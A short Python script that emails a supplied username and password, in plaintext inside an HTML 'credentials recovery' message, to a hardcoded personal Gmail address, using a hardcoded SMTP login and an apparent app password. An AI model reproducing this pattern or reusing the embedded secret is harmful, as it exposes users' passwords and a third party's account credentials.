import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from getpass import getpass

def send_email(username, password) -> bool:
    subject = "Alpix Dispatch Admin Credentials Recovery"
    body = f'<div style="text-align: center; padding: 20px;"><div style="background-color: #ffffff; border-radius: 10px; padding: 20px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);"><h2 style="color: #333333;">Alpix Dispatch Here 😊</h2><p style="color: #555555;">We securely save your credentials in our database</p><hr style="border: 1px solid #dddddd; margin: 20px 0;"><div style="text-align: left; padding: 10px 0;"><strong style="color: #333333;">Username:</strong> {username}<br><strong style="color: #333333;">Password:</strong> {password}</div><p style="color: #555555;">Regards<br>Team Alpix Dispatch 🤝<br>COPYRIGHT © 2023 ALPIX DISPATCH MANAGEMENT BPO. ALL RIGHTS RESERVED.</p></div></div>'
  
    to_email = "syedinshal62@gmail.com"  # Replace with the recipient's email address

    # SMTP server details (for example, using Gmail)
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    smtp_username = "idm.bpo@gmail.com"  # Replace with your Gmail email address
    smtp_password = "edaprvpkghjnbjkv"
    
    try:
        # Create the email message
        msg = MIMEMultipart()
        msg['From'] = smtp_username
        msg['To'] = to_email
        msg['Subject'] = subject

        # Attach the HTML body of the email
        msg.attach(MIMEText(body, 'html'))

        # Connect to the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)

        # Send the email
        server.sendmail(smtp_username, to_email, msg.as_string())
        server.quit()
        return True
    except Exception as e:
        return False


